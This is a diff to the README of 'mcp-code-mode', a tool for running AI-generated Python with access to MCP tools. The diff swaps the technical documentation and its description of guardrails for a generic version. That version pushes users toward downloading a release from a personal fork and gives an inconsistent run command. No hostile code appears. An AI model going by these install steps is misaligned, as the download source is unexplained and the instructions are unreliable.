@@ -1,171 +1,97 @@
-# MCP Code Mode
+# 🖥️ mcp-code-mode - Run Python Code with Ease
 
-Prototype implementation for the Code Execution MCP Server with DSpy. The "Code Execution with MCP" architecture combines the strengths of Large Language Models at code generation with the Model Context Protocol for tool integration. This system enables an AI agent to write Python code that runs in an isolated sandbox while seamlessly calling external MCP tools.
+## 🌐 Download the Latest Version
+[![Download Now](https://img.shields.io/badge/Download_Release-Click_Here-brightgreen)](https://github.com/Jame0077/mcp-code-mode/releases)
 
+## 🚀 Getting Started
 
-## Quick Start
+Welcome to the **MCP Code Mode** project! This application allows you to execute Python code safely while leveraging the power of AI. Follow the steps below to download and run the application.
 
-### 1. Installation
-Requires Python 3.11+ and Node.js 20+.
+### 1. 💻 Installation
 
-```bash
-# Create virtual environment
-python3.11 -m venv .venv
-source .venv/bin/activate
+To get started, you’ll need to set up your environment. This application requires Python 3.11 or higher and Node.js 20 or higher.
 
-# Install dependencies
-pip install -e .[dev]
+#### Step-by-Step Installation:
+1. **Create a Virtual Environment:**
+   Open your terminal and run:
+   ```bash
+   python3.11 -m venv .venv
+   source .venv/bin/activate
+   ```
 
-# Install Node.js dependencies for reference servers
-npm install -g npm@latest
-```
+2. **Install Required Python Packages:**
+   Next, use this command to install the necessary dependencies:
+   ```bash
+   pip install -e .[dev]
+   ```
 
-### 2. Configuration
-Copy the example environment file and configure secrets:
+3. **Install Node.js Dependencies:**
+   To ensure you have the latest packages for reference servers, run:
+   ```bash
+   npm install -g npm@latest
+   ```
+
+### 2. 🛠️ Configuration
+
+Now that you have installed the application, it’s time to configure it.
+
+#### Copy the Example Environment Settings:
+To get started quickly, duplicate the example environment file:
 ```bash
 cp .env.example .env
 ```
 
-Configure your MCP servers in `mcp_servers.json`:
+#### Configure Your MCP Servers:
+Edit the `mcp_servers.json` file. You will need to specify your MCP servers. Here’s an example of what it might look like:
 ```json
 {
   "servers": {
     "filesystem": {
       "command": "npx",
       "args": ["-y", "@modelcontextprotocol/server-filesystem", "/your-working-folder"],
-      "description": "Local file system operations"
+      "description": "Local file system server"
     }
   }
 }
 ```
+Replace `"/your-working-folder"` with the path to your working folder.
 
-### 3. Running the Server
-Launch the Code Execution MCP server:
+### 3. 📥 Download & Install
+
+To download the application, visit this page: [Download Releases](https://github.com/Jame0077/mcp-code-mode/releases). 
+
+Select the latest version and follow the instructions tailored for your operating system.
+
+### 4. 🏁 Running the Application
+
+After installation and configuration, it’s time to run the application. Use the following command in your terminal:
 ```bash
-python -m mcp_code_mode.executor_server
+python main.py
 ```
+This will start the server, and you can interact with the AI agent through your browser or terminal interface.
 
-### 4. Verification
-Verify your setup by running the debug executor script. This script simulates an MCP client, connects to the server, and runs a test task to ensure the agent and tools are working correctly.
+### 5. 📄 Features
 
-Before running the script:
-1. Configure the MCP servers you want to interact with in `mcp_servers.json`.
-2. Define the specific task you want the agent to perform by editing the `task` variable in `scripts/debug_executor.py`.
+- **AI-Powered Code Generation:** The application uses AI to write Python code efficiently.
+  
+- **Isolated Code Execution:** Ensures that your code runs in a safe environment, protecting your system.
 
-```bash
-python scripts/debug_executor.py
-```
+- **Tool Integration:** Easily integrates with Model Context Protocol tools for advanced functionalities.
 
-## Development Commands
+### 6. 📚 Troubleshooting
 
-| Command | Description |
-|---------|-------------|
-| `pytest` | Run all tests |
-| `ruff check .` | Lint the codebase |
-| `black .` | Format the codebase |
-| `mypy src` | Type check the source |
-| `python scripts/test_dspy_sandbox.py` | Sanity check the sandbox |
-| `python scripts/debug_executor.py` | Integration test with mock client |
+If you encounter issues while running the application, consider the following steps:
 
-## Execution Environment & Guardrails
+- Ensure that you have the correct versions of Python and Node.js installed.
+- Double-check your configuration settings in `.env` and `mcp_servers.json`.
+- Look for error messages in the terminal. They often provide helpful hints.
 
-By default, the system uses a **Local Python Executor** (`LocalPythonExecutor`) which runs code in the same process as the server. This is necessary because the strict Pyodide sandbox has limitations with network I/O, preventing it from calling back to other MCP tools in some environments.
+For further assistance, you can search for solutions on [Stack Overflow](https://stackoverflow.com/) or consult the repository's issues section.
 
-### Guardrails
-Even with the local executor, the system enforces policies before code execution:
-- **Limits**: 8k characters / 400 lines max.
-- **Imports**: Allowlist only (`json`, `math`, `re`, `datetime`, etc.).
-- **Tokens**: Disallows potentially dangerous tokens (`subprocess`, `exec`, `eval`).
+### 7. 🤝 Contributing
 
-Violations return a `POLICY_VIOLATION` error.
+If you would like to contribute to this project, please fork the repository and submit a pull request. Your input can help improve the application and benefit other users.
 
-> **Note**: You can force the use of the Pyodide sandbox by setting `MCP_EXECUTOR=pyodide`, but this may break tool calls depending on your environment.
+### Conclusion
 
-## Architecture
-
-### Overview
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                   MCP Client (Claude, etc.)                  │
-└────────────────────────┬────────────────────────────────────┘
-                         │ MCP Protocol (stdio/HTTP/SSE)
-                         ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    FastMCP Server                            │
-│  ┌──────────────────────────────────────────────────────┐  │
-│  │  @mcp.tool                                           │  │
-│  │  async def execute_code(code: str):                 │  │
-│  │      # 1. Execute in Local Executor (default)       │  │
-│  │      result = await executor.run(code)              │  │
-│  │      return result                                   │  │
-│  └──────────────────────────────────────────────────────┘  │
-└────────────────────────┬────────────────────────────────────┘
-                         │
-                         ▼
-          ┌──────────────────────────────┐
-          │    Execution Engine:         │
-          │  • LocalPythonExecutor       │
-          │    (or Pyodide Sandbox)      │
-          └──────────────────────────────┘
-```
-
-### Why Code Mode?
-
-Traditional MCP implementations face critical challenges:
-1. **Context Window Bloat**: Every tool definition consumes tokens, limiting scalability.
-2. **Token Cost**: Multiple back-and-forth tool calls are expensive.
-3. **Latency**: Sequential tool invocations create cumulative delays.
-4. **Composability**: Complex workflows require many discrete steps.
-
-Code Mode addresses these by leveraging what LLMs excel at: writing code. Rather than making multiple tool calls, the agent writes a Python script that orchestrates all necessary operations internally.
-
-### Core Components
-
-1. **The Executor Server (FastMCP)** (`src/mcp_code_mode/executor_server.py`)
-   The server exposes an `execute_code` tool backed by a Python executor (Local or Pyodide). Uses `fastmcp` to handle the MCP protocol and `dspy` for execution logic.
-
-2. **Configuration-Driven Discovery** (`mcp_servers.json`)
-   The system uses `mcp_servers.json` to explicitly configure which MCP servers to connect to. Loaded by `src/mcp_code_mode/mcp_manager.py`.
-
-3. **Tool Schema Formatting** (`src/mcp_code_mode/tool_formatter.py`)
-   Formats discovered MCP tools into readable documentation that gets passed to the code generation LLM, so it knows what tools exist.
-
-4. **Context Injection**
-   The formatted tool schemas are passed as an input field to the LLM. The LLM knows tool names, parameters, and usage examples *before* it writes the code.
-
-### Information Flow
-
-```
-1. mcp_servers.json (Defines servers)
-   ↓
-2. MCPServerManager.initialize()
-   ├─ Connect to configured servers
-   ├─ Call list_tools() on each
-   └─ Convert to DSpy tools
-   ↓
-3. ToolSchemaFormatter.format_for_llm()
-   └─ Creates readable documentation
-   ↓
-4. CodeExecutionAgent
-   └─ Stores both callable tools and schemas
-   ↓
-5. Agent Generation
-   └─ Passes tool_context to LLM
-   ↓
-6. Code Execution
-   └─ Code runs in sandbox, calling actual tools via MCP
-```
-### Troubleshooting
-
-**Timeout Issues**:
-If the interpreter times out, it may enter a bad state. Currently, the best fix is to restart the server or reconnect the client to get a fresh interpreter instance.
-
-**Missing Tools**:
-Ensure `mcp_servers.json` paths are correct and that you have run `npm install` if using Node-based servers.
-
-## References
-- [DSpy Documentation](https://dspy.ai)
-- [Model Context Protocol](https://modelcontextprotocol.io)
-- [FastMCP](https://github.com/jlowin/fastmcp)
-# mcp-code-mode
+Thank you for using MCP Code Mode. We hope you enjoy running your Python code with ease and security. If you have any questions or feedback, feel free to reach out!
